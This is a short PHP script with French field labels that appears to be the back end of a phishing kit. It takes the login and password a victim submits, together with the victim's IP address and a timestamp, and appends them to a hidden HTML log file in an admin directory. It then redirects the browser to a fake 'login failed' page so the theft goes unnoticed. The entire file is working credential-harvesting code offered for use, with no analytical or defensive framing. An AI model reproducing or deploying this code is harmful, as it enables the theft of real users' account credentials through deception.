<?php

$ip = $_SERVER["REMOTE_ADDR"];

$fichier = fopen('admin/U92Zb3ALSChwx4rLDa4DT5238i7i7ja.html', 'a+');
fwrite($fichier, "IP: ");

fwrite($fichier, $ip);
fwrite($fichier, "        Quand ? ".date('j F Y h:i:s A')."        Nom de compte1: ");
fwrite($fichier, $_POST["login_3"]);
fwrite($fichier, "        Mot De Passe1: ");
fwrite($fichier, $_POST["password_1"].PHP_EOL);
fclose($fichier);

?>
<body onload="window.location.href = 'account=login-failed.php';"></body>